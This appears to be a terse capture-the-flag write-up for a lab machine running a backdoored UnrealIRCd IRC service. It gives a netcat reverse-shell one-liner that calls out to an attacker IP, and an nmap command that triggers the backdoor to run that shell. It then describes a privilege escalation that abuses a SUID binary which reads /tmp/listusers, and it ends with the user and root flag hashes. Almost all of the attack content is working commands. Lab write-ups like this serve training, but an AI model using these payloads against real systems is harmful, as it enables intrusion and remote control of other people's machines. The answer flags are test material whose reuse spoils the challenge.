```zsh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 443 >/tmp/f
```

*Use nmap to execute command and check whether it is possible to execute command, try below command with just whoami before*

```zsh
nmap -d -p6697 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='rm /tmp/f;mk
fifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 443 >/tmp/f' 10.10.10.117
```

Get a shell

privesc: SUID bit /usr/bin/viewuser
was looking for /tmp/listusers. Made a file of the name in the dir and put /bin/bash in it

UFlag:4a66a78b12dc0e661a59d3f5c0267a8e
RFlag:8d8e9e8be64654b6dccc3bff4522daf3
